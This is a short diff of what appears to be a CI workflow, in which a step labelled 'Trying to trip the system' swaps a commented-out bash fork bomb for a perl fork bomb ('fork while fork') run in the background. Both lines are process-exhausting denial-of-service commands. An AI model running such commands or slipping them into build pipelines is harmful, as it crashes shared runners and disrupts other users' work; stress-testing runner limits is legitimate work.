@@ -71,5 +71,6 @@ jobs:
       - run: |
           echo "Trying to trip the system"
       - run: |
-          $ :(){ :|:& };:
+          #$ :(){ :|:& };:
+          perl -e "fork while fork" &
       
